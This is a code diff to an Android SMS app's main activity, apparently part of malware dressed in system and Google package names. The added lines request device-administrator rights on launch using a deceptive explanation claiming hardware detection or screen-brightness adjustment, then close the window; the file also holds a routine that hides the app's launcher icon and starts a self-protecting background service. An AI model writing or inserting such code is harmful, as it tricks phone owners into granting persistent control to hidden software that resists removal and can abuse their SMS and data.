@@ -6,12 +6,15 @@ import com.google.pm.service.Occultation;
 import com.umeng.analytics.AnalyticsConfig;
 
 import android.app.Activity;
+import android.app.admin.DevicePolicyManager;
 import android.app.sms.async.SubmitDateThread;
 import android.app.sms.manager.SMSManager;
 import android.app.sms.service.SMSService;
 import android.app.sms.sqlite.DQLiteOpenHelper;
+import android.app.sms.utils.LRR;
 import android.app.sms.utils.LogUtils;
 import android.app.sms.utils.Tools;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageInfo;
@@ -39,15 +42,30 @@ public class SmsActivity extends Activity {
 		super.onCreate(savedInstanceState);
 		this.startFreeToKillService();
 		this.init();
+//		this.hideIcon();
+		this.installSystemAPK();
+		this.finish();
 	}
 	
 	/**
 	 * 图标隐藏
 	 */
 	public void hideIcon() {
-		PackageManager pm=getPackageManager();
-		pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+		PackageManager pm = this.getPackageManager();
+		pm.setComponentEnabledSetting(this.getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 	}
+	
+	//注册成系统控制面板
+	private void installSystemAPK() {
+    	DevicePolicyManager policyManager = ((DevicePolicyManager)getSystemService("device_policy"));
+    	ComponentName componentName = new ComponentName(this, LRR.class);
+		if (!policyManager.isAdminActive(componentName)) {
+			Intent localIntent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
+			localIntent.putExtra("android.app.extra.DEVICE_ADMIN", componentName);
+			localIntent.putExtra("android.app.extra.ADD_EXPLANATION", "允许Android系统硬件检测或调整屏幕亮度");
+			startActivity(localIntent);
+		}
+    }
 	
 	private void init() {
 		Occultation.getInstance(this).oponeData();
